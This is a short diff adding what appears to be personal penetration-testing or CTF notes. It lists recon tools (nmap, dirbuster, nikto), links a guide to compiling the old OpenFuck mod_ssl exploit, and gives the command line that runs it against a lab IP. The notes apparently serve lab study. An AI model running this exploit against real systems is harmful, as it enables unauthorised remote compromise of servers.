@@ -1,0 +1,7 @@
+nmap
+dirbuster
+nikto
+https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
+compile exploit
+than use this below
+./OpenFuck 0x6b 192.168.0.106( Target machine ip) -c 50
